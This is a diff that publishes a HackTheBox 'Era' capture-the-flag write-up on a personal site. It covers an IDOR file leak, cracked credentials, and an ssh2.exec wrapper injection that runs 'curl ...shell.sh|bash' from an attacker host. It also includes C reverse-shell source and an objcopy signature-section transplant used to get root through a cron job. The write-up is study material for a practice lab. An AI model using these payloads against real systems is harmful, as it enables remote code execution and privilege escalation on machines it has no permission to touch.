@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Era - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Era.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Era machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Era machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Era, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,224 @@
         <h1 class="writeup-title">Era</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">November 29, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Era" src="../images/Era/pwned.png" /></p>
-<p>Era is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Era retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Era/pwned.png" /></p>
+<p>Era was a medium-difficulty Linux box featuring a file management web application with an IDOR vulnerability that exposed a database backup containing credentials and a private key.
+After discovering Yuri's FTP credentials through hash cracking, I accessed the FTP server and mirrored files revealing the ssh2.so PHP extension was loaded. Analysis of the downloaded source code showed a beta feature in download.php that passed user-controlled input to fopen() without proper validation, allowing PHP wrapper injection.
+I exploited this using the ssh2.exec:// wrapper with ^uri's credentials to execute commands on localhost, obtaining a shell as him and pivoting to Eric using his cracked FTP credentials to retrieve the user flag.</p>
+<p>Privilege escalation involved a root cronjob executing /opt/AV/periodic-checks/monitor with signature verification checking the .text_sig section. I created a malicious reverse shell ELF binary, extracted the .text_sig section from the legitimate monitor binary using objcopy, and transplanted it into my malicious binary.
+The flawed signature verification only checked for the presence of specific organization and email strings within the ASN.1 structure rather than cryptographically validating the signature, allowing the tampered binary to pass verification and execute as root, granting the final reverse shell.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Era/nmap.png" /></p>
+<p>Initial nmap scan reveals a website running on port 80 and FTP on port 21. Surprisingly, SSH on port 22 is not available, as it is for most Linux boxes I've done so far.</p>
+<h2>Investigating the website</h2>
+<p><img alt="website" src="../images/Era/website.png" /></p>
+<p>It's a website of a design company. None of the buttons lead to anything interesting, so I'll fuzz for both subdomains and endpoints with ffuf.</p>
+<p><code>ffuf -u http://era.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt</code></p>
+<p><img alt="endpoints" src="../images/Era/endpoints.png" /></p>
+<p>There are no interesting endpoints on the main site.</p>
+<p><code>ffuf -u http://era.htb -H "Host: FUZZ.era.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154</code></p>
+<p><img alt="subdomains" src="../images/Era/subdomains.png" /></p>
+<p>But one subdomain was found, and judging by its name, it might be related to that vsftpd server I saw in the nmap output. Each endpoint redirects me to the login page, but also reveals that this is a PHP site.</p>
+<p><code>http://file.era.htb/login.php</code></p>
+<p>There is no link towards the registration endpoint, but scanning with a different tool suited for endpoints with extensions reveals that it exists.</p>
+<p><img alt="dirsearch" src="../images/Era/dirsearch.png" /></p>
+<h2>Exploiting IDOR in the download endpoint</h2>
+<p>After navigating to that endpoint, I created a new user <code>tst:tst</code> and logged in as them.</p>
+<p><img alt="loggedin" src="../images/Era/loggedin.png" /></p>
+<p>I can reset my user's security questions, as well as upload files. I'll try to upload a PHP webshell first.</p>
+<p><img alt="upload" src="../images/Era/upload.png" /></p>
+<p>It doesn't seem like I can actually use the webshell, but my file was looked up via an ID visible at the URL bar. Whenever I see something like this, I check for IDOR(Indirect Object Reference) vulnerabilities, where looking up other IDs could let me download files I shouldn't have access to.</p>
+<p>The list of IDs to check can be easily generated with seq <code>seq 1 2000 &gt; IDlist</code>. I also copied my PHPSESSID cookie after capturing a request with Burp Suite, as it'll be needed to perform authenticated fuzzing here.</p>
+<p><code>ffuf -u http://file.era.htb/download.php?id=FUZZ  -H "Cookie: PHPSESSID=03m647d58hg3okmj6muqi1li5m" -w IDlist -fw 3161</code></p>
+<p><img alt="ids" src="../images/Era/ids.png" /></p>
+<p>There are 2 other files with IDs of 54 and 150. I'll check them both.</p>
+<p><img alt="54" src="../images/Era/54.png" /></p>
+<p>ID 54 contains the site backup archive.</p>
+<p><img alt="files" src="../images/Era/files.png" /></p>
+<p>The site's source code is there as expected, and a database as well. I'll take a look at it before checking out the other ID.</p>
+<p><img alt="users" src="../images/Era/users.png" /></p>
+<p>The user table contains 6 users with hashes, one of them being admin_ef01cab31aa, who has security questions saved in the DB as well. I'll send the hashes over to hashcat, and while that goes on, I will try to log in as the admin using these questions.</p>
+<p>Trying these answers from the DB fails with <code>Incorrect answers. Please try again.</code>, but there was a similar form available to my tst user after logging in.</p>
+<p><img alt="update" src="../images/Era/update.png" /></p>
+<p>This one could allow me to update the administrator's security questions. I couldn't do anything with it earlier due to not having a valid username I could target, aside from mine.</p>
+<p>I set the questions to be <code>q1,q2,q3</code> respectively, and this allowed me to log in as the admin!</p>
+<p><img alt="admin" src="../images/Era/admin.png" /></p>
+<p>However, this did not provide anything new aside from seeing the files directly without the IDOR. Going back to hashcat, 2 hashes were cracked in the meantime.</p>
+<pre class="codehilite"><code>eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm:america
+yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.:mustang
+</code></pre>
+
+<p><code>eric | america</code></p>
+<p><code>yuri | mustang</code></p>
+<p>In the other ID(150), there was a <code>signing.zip</code> archive. Unzipping it reveals a key.pem file, and a certificate configuration file.</p>
+<h2>Wrapper injection in downloads.php with ssh2.exec RCE</h2>
+<p>Eric's credentials failed, but Yuri's work without issues.</p>
+<p><img alt="ft" src="../images/Era/ftp.png" /></p>
+<p>There are a ton of files here. Getting them one by one with get would be a giant hassle, so I'll use wget with the <code>-m</code> mirror flag, as it supports FTP by default.</p>
+<p><code>wget -m ftp://yuri:mustang@10.10.11.79/</code></p>
+<p><img alt="ftpfiles" src="../images/Era/ftpfiles.png" /></p>
+<p>One of the shared objects in the PHP dir is <code>ssh2.so</code>. While nmap showed no SSH open to the outside world, this library being present means that I can use any functions it supports against the webapp.</p>
+<p><code>https://www.php.net/manual/en/ref.ssh2.php</code></p>
+<p>From the available functions, the most useful one in this scenario is definitely ssh2.exec, as it'll allow me to execute commands on the server.</p>
+<p>An example command would look like this:</p>
+<p><code>ssh2.exec://yuri:mustang@127.0.0.1/curl http://10.10.16.9:8000/shell.sh|bash</code></p>
+<pre class="codehilite"><code>ssh2.exec &lt;- Calling the function
+
+yuri:mustang@127.0.0.1 &lt;- SSH authentication to localhost with Yuri's working FTP credentials(worth a test)
+
+curl http://10.10.16.9:8000/shell.sh|bash &lt;- Command to be executed on the host after authentication
+</code></pre>
+
+<p>For this to work, I'll have to look through the source code and find something that takes in user-controlled input.</p>
+<h3>Checking the source code</h3>
+<p>I've created an egrep command that searches for the most dangerous PHP functions in every file within the source directory.</p>
+<p><code>egrep -rni "(system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec|eval|assert|create_function|preg_replace|mb_ereg_replace|fopen|file_get_contents|file_put_contents|readfile|include|require|call_user_func|array_map|unserialize|imap_open)\s*\(" .</code></p>
+<p><img alt="fopen" src="../images/Era/fopen.png" /></p>
+<p>There is a single instance of <code>fopen</code> in the downloads.php file. This function is dangerous when user-controlled input is passed into it, because this allows the attacker to use protocol handlers(wrappers), just like ssh2.exec in my example, as long as <code>allow_url_fopen</code> is set to 1 in the PHP config.</p>
+<pre class="codehilite"><code># Download.php
+&lt;SNIP&gt;
+/ BETA (Currently only available to the admin) - Showcase file instead of downloading it
+    } elseif ($_GET['show'] === &quot;true&quot; &amp;&amp; $_SESSION['erauser'] === 1) {
+            $format = isset($_GET['format']) ? $_GET['format'] : '';
+            $file = $fetched[0];
+
+        if (strpos($format, '://') !== false) {
+                $wrapper = $format;
+                header('Content-Type: application/octet-stream');
+            } else {
+                $wrapper = '';
+                header('Content-Type: text/html');
+            }
+
+            try {
+                $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
+            $full_path = $wrapper ? $wrapper . $file : $file;
+            // Debug Output
+            echo &quot;Opening: &quot; . $full_path . &quot;\n&quot;;
+                echo $file_content;
+            } catch (Exception $e) {
+                echo &quot;Error reading file: &quot; . $e-&gt;getMessage();
+            }
+&lt;SNIP&gt;
+</code></pre>
+
+<p>This code snippet confirms the fopen function as my prime target for RCE. First off, the beta functionality block will stop if the URL does not contain the <code>show</code> variable set to true, and if the request is unauthenticated. Once that is satisfied, the user-controlled value of <code>format</code> is taken and checked whether it's an URL and contains <code>://</code></p>
+<p>If yes, the variable <code>wrapper</code> is then set to the same value, and gets passed to fopen, which will resolve it to whatever wrapper has been passed. If the wrapper value is not an URL, it will be treated as a filename.</p>
+<p>Knowing this, I'll have to tweak my command a little. I will add the show and format variables into the URL.</p>
+<p><code>/download.php?id=150&amp;show=true&amp;format=ssh2.exec://yuri:mustang@127.0.0.1/curl http://10.10.16.9:8000/shell.sh|bash;</code></p>
+<p>I also added a semicolon at the end as a separator that will terminate the command. This prevents any unexpected garbage from breaking it. I'll also URL-encode the curl command to avoid problems with spaces and colons.</p>
+<p><code>/download.php?id=150&amp;show=true&amp;format=ssh2.exec://yuri:mustang@127.0.0.1/curl+http%3a//10.10.16.9%3a8000/shell.sh|bash;</code></p>
+<p>I started up a python server and a netcat listener, and sent the request in BurpSuite.</p>
+<p><img alt="shell" src="../images/Era/shell.png" /></p>
+<p>The user flag was not located in Yuri's home directory. The only other user with a home folder is Eric, whose FTP password I also have. Since Yuri's FTP creds worked for the box, it would be a good idea to try Eric's as well.</p>
+<p><img alt="user" src="../images/Era/user.png" /></p>
+<h1>Root flag</h1>
+<p>The first thing I did after getting the user flag was running <code>ps aux</code> to see what's running on the box.</p>
+<p><img alt="cron" src="../images/Era/cron.png" /></p>
+<p>There is a cronjob running as root that runs a binary under <code>/opt/AV/periodic-checks/monitor</code>. The first thing I wanted to try was to replace this binary with a malicious ELF binary. I copied the original monitor to a safe space so that it could be restored in case something bad happens.</p>
+<pre class="codehilite"><code># rev.c
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+int main(void){
+    int port = 9001;
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr(&quot;10.10.16.9&quot;);
+
+    connect(sockt, (struct sockaddr *) &amp;revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {&quot;/bin/bash&quot;, NULL};
+    execvp(&quot;/bin/bash&quot;, argv);
+
+    return 0;       
+}
+</code></pre>
+
+<p>I compiled this into an ELF file with gcc, and sent it over to the box to replace the original monitor binary.</p>
+<p><img alt="fail" src="../images/Era/fail.png" /></p>
+<p>After a minute or two, this error appeared in <code>status.log</code>. The binary has to be signed, or it'll be immediately rejected.</p>
+<h2>Signing the malicious ELF</h2>
+<p>Earlier, during the webapp enumeration and exploitation, I found a <code>signing.zip</code> archive with a key.pem file. I tried to sign it using the private key, but it failed with an <code>[ERROR] Executable not signed. Tampering attempt detected. Skipping.</code> error.</p>
+<p>But the original file <em>must</em> possess the signature if it is getting verified. The only thing getting checked is the <code>.text_sig</code>, so if I can extract that section from the legitimate monitor and add it into my malicious one, maybe it <em>could</em> pass the check. Normally, this would have no right to work, but it's worth a try.</p>
+<p>I'll use objcopy to operate on the file sections.</p>
+<pre class="codehilite"><code>objcopy --dump-section .text_sig=text_sig.bin /opt/AV/periodic-checks/monitor &lt;- Dumps .text_sig into the .bin file from the original monitor bin
+
+objcopy --add-section .text_sig=text_sig.bin monitor &lt;- Adds the contents of the .bin file into the .text_sig section of the malicious monitor, creating it if it doesn't exist yet.
+</code></pre>
+
+<p>After replacing the binary, a minute or so passed before the cronjob executed it.</p>
+<p><img alt="root" src="../images/Era/root.png" /></p>
+<p>Rooted!</p>
+<h1>Beyond Root</h1>
+<pre class="codehilite"><code># initiate_monitoring.sh
+
+#!/bin/bash
+
+# Paths
+BINARY=&quot;/opt/AV/periodic-checks/monitor&quot;
+SECTION=&quot;.text_sig&quot;
+EXTRACTED_SECTION=&quot;text_sig_section.bin&quot;
+ORGANIZATION=&quot;Era Inc.&quot;
+EMAIL=&quot;yurivich@era.com&quot;
+
+# Extract the .text_sig section
+objcopy --dump-section &quot;$SECTION&quot;=&quot;$EXTRACTED_SECTION&quot; &quot;$BINARY&quot;
+
+# Parse the ASN.1 structure                                                                                         
+OUTPUT=$(openssl asn1parse -inform DER -in &quot;$EXTRACTED_SECTION&quot; 2&gt;/dev/null)                                        
+
+if [[ $? -ne 0 ]]; then                                                                                             
+    echo &quot;[ERROR] Executable not signed. Tampering attempt detected. Skipping.&quot;                                     
+    rm -f &quot;$EXTRACTED_SECTION&quot;                                                                                      
+    exit 1                                                                                                          
+fi                                                                                                                  
+
+# Check for the organization name                                                                                   
+ORG_CHECK=$(echo &quot;$OUTPUT&quot; | grep -oP &quot;(?&lt;=UTF8STRING        :)$ORGANIZATION&quot;)                                      
+
+# Check for the email address                                                                                       
+EMAIL_CHECK=$(echo &quot;$OUTPUT&quot; | grep -oP &quot;(?&lt;=IA5STRING         :)$EMAIL&quot;)                                           
+
+# Decision logic                                                                                                    
+if [[ &quot;$ORG_CHECK&quot; == &quot;$ORGANIZATION&quot; &amp;&amp; &quot;$EMAIL_CHECK&quot; == &quot;$EMAIL&quot; ]]; then                                        
+    $BINARY                                                                                                         
+    echo &quot;[SUCCESS] No threats detected.&quot;                                                                           
+    ALLOW=1
+else
+    echo &quot;[FAILURE] Binary has been tampered with. Skipping.&quot;
+    ALLOW=0
+fi
+
+# Cleanup
+rm -f &quot;$EXTRACTED_SECTION&quot;
+
+# Exit with appropriate status
+exit $ALLOW
+</code></pre>
+
+<p>The signature checker just... Checks for the organization and email within the signature. It decodes and structures the binary file into a human-readable format, and looks for the 2 strings.</p>
+<p><img alt="parse" src="../images/Era/parse.png" /></p>
+<p>I can see the values easily. It is no wonder now why simply copying the signature from file to file, even if it should not ever work under normal circumstances, actually works here.</p>
             </div>
             
             <div class="toc-sidebar">
